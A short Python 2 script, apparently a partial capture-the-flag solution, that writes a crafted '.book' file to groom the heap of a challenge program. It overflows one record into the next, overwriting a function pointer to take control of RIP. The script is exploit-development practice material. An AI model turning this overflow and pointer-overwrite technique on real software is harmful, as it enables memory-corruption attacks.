import struct

g_file_data = ""

def build_header():
	global g_file_data
	# Construct Header (including the magic)
	MAGIC = 0x4b4f4f42
	g_file_data += struct.pack("I", MAGIC)


def add_book(title, abstract, content, is_unicode):
	"""
	#pragma pack(1)
	typedef struct _tagBOOK{
		char title[32];
		char abstract[256];
		void (*fptr)(struct _tagBOOK*);	
		UINT content_len;
		BOOL is_unicode;
		char* content;
		struct _tagBOOK* next;
	}BOOK;
	"""
	global g_file_data
	g_file_data += (title+32 * ' ')[:32]											# title
	g_file_data += (abstract+256* ' ')[:256]										# absract
	g_file_data += 8 * ' '															# fptr
	g_file_data += struct.pack("I", len(content))									# content_len
	g_file_data += struct.pack("I", 1) if is_unicode else struct.pack("I", 0)		# is_unicode
	g_file_data += 8 * ' '															# content ptr
	g_file_data += 8 * ' '															# next
	g_file_data += content															# the actual content

def generate_exploit():
	"""
	Control RIP.
	Run lfh with the output file of this script with the parameter 1 (Secure mode).
	This tries to beat randomization so you'll probably need to run it more than once to make it work.
	* This doesn't solve the CTF, but I think this is part of it.
	"""
	global g_file_data
	build_header()

	for i in xrange(12):
		# printf
		# Don't overwrite the next!
		add_book("My book", "This is aaaa's book", "A"*0x144, True)
		g_file_data += 12*'A'																# Fill the end 
		g_file_data += ("flag"+32 * '\x00')[:32]										# title
		g_file_data += 'A' * 256														# absract
		g_file_data += struct.pack("Q", 0xAAAAAAAAAAAAAAAA)								# fptr - Controlled RIP
		g_file_data += struct.pack("I", 4)												# content_len
		g_file_data += struct.pack("I", 1)												# is_unicode
		g_file_data += struct.pack("Q", 0x000000000040067C)								# content ptr
	
	with open("exploit_feng_shui.book", "wb") as f:
		f.write(g_file_data)	


def main():
	generate_exploit()


if __name__ == '__main__':
	main()

